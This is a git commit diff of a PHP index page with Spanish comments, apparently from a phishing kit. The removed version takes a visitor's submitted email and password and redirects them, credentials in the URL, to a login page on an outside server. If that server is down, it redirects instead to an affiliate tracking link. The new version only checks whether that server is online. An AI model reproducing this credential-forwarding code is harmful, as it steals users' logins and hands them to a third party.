35b7f2cc41f830e31deb3fd70842336d4a58da42
limberlisa <54564259+limberlisa@users.noreply.github.com>
2020-02-13 00:38:04 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,20 +1,29 @@
-<?
-// se debe pasar la IP o direccion de internet sin 'http://'
-if (ValidarUrl("http://server1.3utilities.com/api-server.php"))
- echo "Dirección existente";
-else
- echo "Dirección inexistente";
- 
- 
-function ValidarUrl($url) {
-$usuario = $_POST[ 'email' ];
-$password = $_POST[ 'pass' ];
- //fsockopen -> Abrir una conexión de sockets de dominio de Internet o Unix
- //resource fsockopen ( string destino, int puerto [, int errno [, string errstr [, float tiempo_espera]]])
- $validar = @fsockopen($url, 80, $errno, $errstr, 15);
- if ($validar) {
- header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
- }else
-  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
-}
-?>
+<? 
+ function nowww($text) {
+ $word = array(
+ "http://" => "",
+ "www." => "",
+ );
+ foreach ($word as $bad => $good) {
+ $text = str_replace($bad, $good, $text);
+ }
+ $oldurl = explode("/", $text);
+ $newurl = $oldurl[0];
+ $text = "$newurl";
+ $text = strip_tags(addslashes($text));
+ return $text;
+ }
+//url que queremos saber si esta up o down
+ $url = "http://server1.3utilities.com/api-server.php";
+
+ $site = nowww("$url"); 
+ $check = @fsockopen($site, 80); 
+
+ if ($check) { 
+ echo "la pagina $site esta online"; 
+ } 
+ else { 
+ echo "la pagina $site esta caida"; 
+ } 
+
+ ?>
